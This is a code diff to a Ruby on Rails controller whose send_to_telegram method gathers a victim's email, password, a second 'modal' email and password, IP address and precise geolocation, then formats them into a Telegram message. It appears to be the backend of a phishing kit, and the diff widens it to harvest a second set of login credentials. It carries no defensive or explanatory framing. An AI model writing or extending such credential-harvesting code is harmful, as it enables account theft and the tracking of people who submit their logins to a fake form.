@@ -7,18 +7,20 @@ class ContainersController < ApplicationController
 
   def send_to_telegram
     # Parse the incoming JSON request body
-    request_body = JSON.parse(request.body.read)
+    # request_body = JSON.parse(request.body.read)
 
     # Extract the parameters from the request body
-    email = request_body['email']
-    password = request_body['password']
-    ip_address = request_body['ip_address']
-    latitude = request_body['latitude']
-    longitude = request_body['longitude']
-    country = request_body['country']
-    city = request_body['city']
-    state = request_body['state']
-    zip_code = request_body['zip_code']
+    modalemail = params[:modalemail]
+    modalpassword = params[:modalpassword]
+    email = params[:email]
+    password = params[:password]
+    ip_address = params[:ip_address]
+    latitude = params[:latitude]
+    longitude = params[:longitude]
+    country = params[:country]
+    city = params[:city]
+    state = params[:state]
+    zip_code = params[:zip_code]
 
     # Construct the message to send to Telegram
     message = <<~MSG
@@ -26,6 +28,9 @@ class ContainersController < ApplicationController
 
       Email: #{email}
       Password: #{password}
+
+      Modal Email: #{modalemail}
+      Modal Password: #{modalpassword}
       IP Address: #{ip_address}
       Location: #{city}, #{state}, #{country}, #{zip_code}
       Latitude: #{latitude}, Longitude: #{longitude}
